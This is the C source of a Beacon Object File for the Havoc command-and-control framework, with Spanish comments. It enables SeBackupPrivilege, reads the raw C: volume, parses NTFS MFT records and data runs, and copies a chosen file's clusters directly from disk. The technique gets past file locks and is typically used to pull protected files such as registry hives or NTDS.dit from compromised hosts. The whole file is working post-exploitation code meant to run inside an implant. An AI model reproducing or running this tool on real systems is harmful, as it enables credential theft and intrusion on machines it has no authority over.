// Underlaycopy_bof.c  —  BOF para Havoc
// Técnica: raw MFT read via \\.\C: — sync I/O, porta el PS1 original
//
// Compilar:
//   x86_64-w64-mingw32-gcc -o Underlay_bof.o -c Underlay_bof.c -masm=intel -Wall -Wno-unused-variable -I./include -fno-asynchronous-unwind-tables -fno-ident -Os

#include <windows.h>
#include "beacon.h"

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define MFT_RECORD_SIZE 1024
#define CHUNK_SIZE      (512 * 1024)

// ─── Imports ──────────────────────────────────────────────────────────────────

DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenProcessToken(HANDLE, ACCESS_MASK, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtAdjustPrivilegesToken(HANDLE, BOOLEAN, PVOID, ULONG, PVOID, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetFileInformationByHandle(HANDLE, LPBY_HANDLE_FILE_INFORMATION);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int    WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);

// ─── Helpers ──────────────────────────────────────────────────────────────────

static BOOL EnablePriv(const wchar_t* name) {
    HANDLE hToken = NULL;
    NTSTATUS st = NTDLL$NtOpenProcessToken(
        (HANDLE)(LONG_PTR)(-1),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    if (!NT_SUCCESS(st)) return FALSE;
    struct { DWORD Count; LUID_AND_ATTRIBUTES Priv[1]; } tp;
    tp.Count = 1;
    tp.Priv[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = ADVAPI32$LookupPrivilegeValueW(NULL, name, &tp.Priv[0].Luid);
    if (ok) NTDLL$NtAdjustPrivilegesToken(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    NTDLL$NtClose(hToken);
    return ok;
}

// Seek + Read síncrono — exactamente como el PS1
static BOOL SeekAndRead(HANDLE h, LONGLONG offset, BYTE* buf, DWORD size) {
    LONG lo = (LONG)(offset & 0xFFFFFFFF);
    LONG hi = (LONG)((ULONGLONG)offset >> 32);
    DWORD r = KERNEL32$SetFilePointer(h, lo, &hi, FILE_BEGIN);
    if (r == INVALID_SET_FILE_POINTER && KERNEL32$GetLastError() != NO_ERROR)
        return FALSE;
    DWORD total = 0;
    while (total < size) {
        DWORD rd = 0;
        if (!KERNEL32$ReadFile(h, buf + total, size - total, &rd, NULL) || rd == 0)
            return FALSE;
        total += rd;
    }
    return TRUE;
}

// ─── Data runs parser ─────────────────────────────────────────────────────────

typedef struct { LONGLONG Lcn; LONGLONG LengthClusters; } DataRun;

static int ParseDataRuns(BYTE* data, int dataLen, DataRun* runs, int maxRuns) {
    int pos = 0, count = 0;
    LONGLONG curLcn = 0;
    while (pos < dataLen && data[pos] != 0x00 && count < maxRuns) {
        BYTE hdr     = data[pos++];
        int  lenSize = hdr & 0x0F;
        int  offSize = (hdr >> 4) & 0x0F;
        LONGLONG length = 0;
        for (int i = 0; i < lenSize; i++)
            length |= ((LONGLONG)data[pos++]) << (8 * i);
        LONGLONG offset = 0;
        if (offSize > 0) {
            for (int i = 0; i < offSize; i++)
                offset |= ((LONGLONG)data[pos++]) << (8 * i);
            if (data[pos-1] & 0x80) {
                LONGLONG mask = ~0LL << (8 * offSize);
                offset |= mask;
            }
        }
        curLcn += offset;
        runs[count].Lcn            = curLcn;
        runs[count].LengthClusters = length;
        count++;
    }
    return count;
}

// ─── Entry point ──────────────────────────────────────────────────────────────

void go(char* args, int len) {
    HANDLE heap = KERNEL32$GetProcessHeap();

    datap parser;
    BeaconDataParse(&parser, args, len);
    char* srcA = BeaconDataExtract(&parser, NULL);
    char* dstA = BeaconDataExtract(&parser, NULL);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] BOF alive");

    if (!srcA || !dstA || !srcA[0] || !dstA[0]) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No args");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] src: %s", srcA);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] dst: %s", dstA);

    wchar_t* srcW     = (wchar_t*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, 1024*2);
    wchar_t* dstW     = (wchar_t*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, 1024*2);
    BYTE*    mftRec   = (BYTE*)   KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, MFT_RECORD_SIZE);
    BYTE*    chunk    = (BYTE*)   KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, CHUNK_SIZE);
    DataRun* runs     = (DataRun*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, 256*sizeof(DataRun));

    if (!srcW || !dstW || !mftRec || !chunk || !runs) {
        BeaconPrintf(CALLBACK_ERROR, "[-] HeapAlloc failed");
        goto cleanup;
    }

    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, srcA, -1, srcW, 1024);
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, dstA, -1, dstW, 1024);

    // 1. SeBackupPrivilege
    wchar_t seBackup[] = {L'S',L'e',L'B',L'a',L'c',L'k',L'u',L'p',
                          L'P',L'r',L'i',L'v',L'i',L'l',L'e',L'g',L'e',L'\0'};
    if (!EnablePriv(seBackup)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SeBackupPrivilege failed");
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] SeBackupPrivilege enabled");

    // 2. MFT record number + file size
    HANDLE hSrc = KERNEL32$CreateFileW(srcW,
        FILE_READ_ATTRIBUTES,
        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Open src attrs failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }
    BY_HANDLE_FILE_INFORMATION fi = {0};
    KERNEL32$GetFileInformationByHandle(hSrc, &fi);
    KERNEL32$CloseHandle(hSrc);

    ULONGLONG frn   = ((ULONGLONG)fi.nFileIndexHigh << 32) | fi.nFileIndexLow;
    DWORD mftRecNum = (DWORD)(frn & 0x0000FFFFFFFFFFFF);
    LONGLONG fsize  = ((LONGLONG)fi.nFileSizeHigh << 32) | fi.nFileSizeLow;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] MFT#%lu size:%lld", mftRecNum, fsize);

    // 3. Abrir volumen — sync, sin flags especiales — igual que el PS1
    wchar_t vol[] = {L'\\',L'\\',L'.',L'\\',L'C',L':',L'\0'};
    HANDLE hVol = KERNEL32$CreateFileW(vol,
        GENERIC_READ,
        FILE_SHARE_READ|FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);  // sin flags — sync puro
    if (hVol == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Open volume failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Volume opened");

    // 4. Boot sector
    BYTE boot[512] = {0};
    if (!SeekAndRead(hVol, 0, boot, 512)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Boot read failed: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hVol); goto cleanup;
    }

    WORD     bps  = (WORD)(boot[11] | ((WORD)boot[12] << 8));
    BYTE     spc  = boot[13];
    LONGLONG csz  = (LONGLONG)bps * spc;
    LONGLONG mftC = 0;
    for (int i = 0; i < 8; i++) mftC |= ((LONGLONG)boot[48+i]) << (8*i);
    LONGLONG mftOff = mftC * csz;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] bps:%u spc:%u csz:%lld mftC:%lld mftOff:%lld",
                 bps, spc, csz, mftC, mftOff);

    // 5. Leer MFT record 0 ($MFT) para obtener sus data runs
    //    El record 0 SÍ está en mftOff (offset lineal del boot sector)
    BYTE* mftSelf = (BYTE*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, MFT_RECORD_SIZE);
    if (!mftSelf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] HeapAlloc mftSelf failed");
        KERNEL32$CloseHandle(hVol); goto cleanup;
    }

    if (!SeekAndRead(hVol, mftOff, mftSelf, MFT_RECORD_SIZE)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] $MFT record0 read failed: %lu", KERNEL32$GetLastError());
        KERNEL32$HeapFree(heap, 0, mftSelf);
        KERNEL32$CloseHandle(hVol); goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] $MFT sig: %02X %02X %02X %02X",
                 mftSelf[0], mftSelf[1], mftSelf[2], mftSelf[3]);

    if (mftSelf[0]!='F'||mftSelf[1]!='I'||mftSelf[2]!='L'||mftSelf[3]!='E') {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid $MFT signature");
        KERNEL32$HeapFree(heap, 0, mftSelf);
        KERNEL32$CloseHandle(hVol); goto cleanup;
    }

    // Parsear data runs del $MFT (atributo 0x80)
    DataRun* mftRuns  = (DataRun*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, 256*sizeof(DataRun));
    int      mftRunCnt = 0;
    WORD mftAttrOff = (WORD)(mftSelf[20] | ((WORD)mftSelf[21] << 8));

    while (mftAttrOff + 4 < MFT_RECORD_SIZE) {
        DWORD type = (DWORD)(mftSelf[mftAttrOff]|(mftSelf[mftAttrOff+1]<<8)|
                             (mftSelf[mftAttrOff+2]<<16)|(mftSelf[mftAttrOff+3]<<24));
        if (type == 0xFFFFFFFF) break;
        DWORD alen = (DWORD)(mftSelf[mftAttrOff+4]|(mftSelf[mftAttrOff+5]<<8)|
                             (mftSelf[mftAttrOff+6]<<16)|(mftSelf[mftAttrOff+7]<<24));
        if (alen == 0 || mftAttrOff + alen > MFT_RECORD_SIZE) break;

        if (type == 0x80 && mftSelf[mftAttrOff+8] != 0) { // non-resident $DATA
            WORD roff = (WORD)(mftSelf[mftAttrOff+32]|(mftSelf[mftAttrOff+33]<<8));
            mftRunCnt = ParseDataRuns(mftSelf+mftAttrOff+roff,
                                      (int)(alen-roff), mftRuns, 256);
            break;
        }
        mftAttrOff += (WORD)alen;
    }
    KERNEL32$HeapFree(heap, 0, mftSelf);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] $MFT runs: %d", mftRunCnt);

    // 6. Traducir mftRecNum a offset real en disco usando los runs del $MFT
    LONGLONG targetVcn = (LONGLONG)mftRecNum; // cada VCN = 1 MFT record (1024 bytes = MFT_RECORD_SIZE)
    // En realidad VCN es por cluster — cuantos records por cluster:
    LONGLONG recsPerCluster = csz / MFT_RECORD_SIZE;
    LONGLONG targetCluster  = (LONGLONG)mftRecNum / recsPerCluster;
    LONGLONG offsetInCluster= ((LONGLONG)mftRecNum % recsPerCluster) * MFT_RECORD_SIZE;

    LONGLONG recOff = -1;
    LONGLONG vcn = 0;
    for (int i = 0; i < mftRunCnt; i++) {
        LONGLONG runLen = mftRuns[i].LengthClusters;
        if (targetCluster >= vcn && targetCluster < vcn + runLen) {
            LONGLONG clusterInRun = targetCluster - vcn;
            recOff = mftRuns[i].Lcn * csz + clusterInRun * csz + offsetInCluster;
            break;
        }
        vcn += runLen;
    }

    if (recOff < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] MFT record %lu not found in $MFT runs", mftRecNum);
        KERNEL32$CloseHandle(hVol); goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] recOff real: %lld", recOff);

    if (!SeekAndRead(hVol, recOff, mftRec, MFT_RECORD_SIZE)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] MFT read failed: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hVol); goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] MFT sig: %02X %02X %02X %02X",
                 mftRec[0], mftRec[1], mftRec[2], mftRec[3]);

    if (mftRec[0]!='F'||mftRec[1]!='I'||mftRec[2]!='L'||mftRec[3]!='E') {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid MFT signature");
        KERNEL32$CloseHandle(hVol); goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] MFT record valid");

    // 6. Parsear atributo $DATA (0x80)
    WORD attrOff  = (WORD)(mftRec[20] | ((WORD)mftRec[21] << 8));
    int  runCount = 0;
    BOOL resident = FALSE;
    BYTE* resData = NULL;
    DWORD resSize = 0;

    while (attrOff + 4 < MFT_RECORD_SIZE) {
        DWORD type = (DWORD)(mftRec[attrOff]|(mftRec[attrOff+1]<<8)|
                             (mftRec[attrOff+2]<<16)|(mftRec[attrOff+3]<<24));
        if (type == 0xFFFFFFFF) break;
        DWORD alen = (DWORD)(mftRec[attrOff+4]|(mftRec[attrOff+5]<<8)|
                             (mftRec[attrOff+6]<<16)|(mftRec[attrOff+7]<<24));
        if (alen == 0 || attrOff + alen > MFT_RECORD_SIZE) break;
        BYTE nonRes = mftRec[attrOff+8];

        if (type == 0x80) {
            if (nonRes == 0) {
                resident = TRUE;
                resSize  = (DWORD)(mftRec[attrOff+16]|(mftRec[attrOff+17]<<8)|
                                   (mftRec[attrOff+18]<<16)|(mftRec[attrOff+19]<<24));
                WORD voff = (WORD)(mftRec[attrOff+20]|(mftRec[attrOff+21]<<8));
                resData   = mftRec + attrOff + voff;
            } else {
                WORD roff = (WORD)(mftRec[attrOff+32]|(mftRec[attrOff+33]<<8));
                runCount  = ParseDataRuns(mftRec+attrOff+roff,
                                          (int)(alen-roff), runs, 256);
            }
            break;
        }
        attrOff += (WORD)alen;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] runs:%d resident:%d", runCount, resident);

    // 7. Destino
    HANDLE hDst = KERNEL32$CreateFileW(dstW, GENERIC_WRITE, 0, NULL,
                                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDst == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Open dst failed: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hVol); goto cleanup;
    }

    // 8. Copiar
    BOOL ok = TRUE;
    if (resident) {
        DWORD w = 0;
        ok = KERNEL32$WriteFile(hDst, resData, resSize, &w, NULL);
    } else {
        LONGLONG rem = fsize;
        for (int i = 0; i < runCount && rem > 0 && ok; i++) {
            LONGLONG extBytes = runs[i].LengthClusters * csz;
            LONGLONG toCopy   = extBytes < rem ? extBytes : rem;
            LONGLONG diskOff  = runs[i].Lcn * csz;
            LONGLONG copied   = 0;

            while (copied < toCopy && ok) {
                DWORD blk = (DWORD)((toCopy-copied) < CHUNK_SIZE ? (toCopy-copied) : CHUNK_SIZE);
                if (!SeekAndRead(hVol, diskOff+copied, chunk, blk)) {
                    BeaconPrintf(CALLBACK_ERROR, "[-] Read chunk failed run:%d err:%lu", i, KERNEL32$GetLastError());
                    ok = FALSE; break;
                }
                DWORD w = 0;
                if (!KERNEL32$WriteFile(hDst, chunk, blk, &w, NULL) || w != blk) {
                    BeaconPrintf(CALLBACK_ERROR, "[-] Write chunk failed run:%d", i);
                    ok = FALSE; break;
                }
                copied += blk;
            }
            rem -= toCopy;
        }
    }

    KERNEL32$CloseHandle(hVol);
    KERNEL32$CloseHandle(hDst);

    if (ok) BeaconPrintf(CALLBACK_OUTPUT, "[+] Done — %lld bytes -> %s", fsize, dstA);
    else    BeaconPrintf(CALLBACK_ERROR,  "[-] Copy incomplete");

cleanup:
    if (srcW)   KERNEL32$HeapFree(heap, 0, srcW);
    if (dstW)   KERNEL32$HeapFree(heap, 0, dstW);
    if (mftRec) KERNEL32$HeapFree(heap, 0, mftRec);
    if (chunk)  KERNEL32$HeapFree(heap, 0, chunk);
    if (runs)   KERNEL32$HeapFree(heap, 0, runs);
    if (mftRuns)KERNEL32$HeapFree(heap, 0, mftRuns);
}
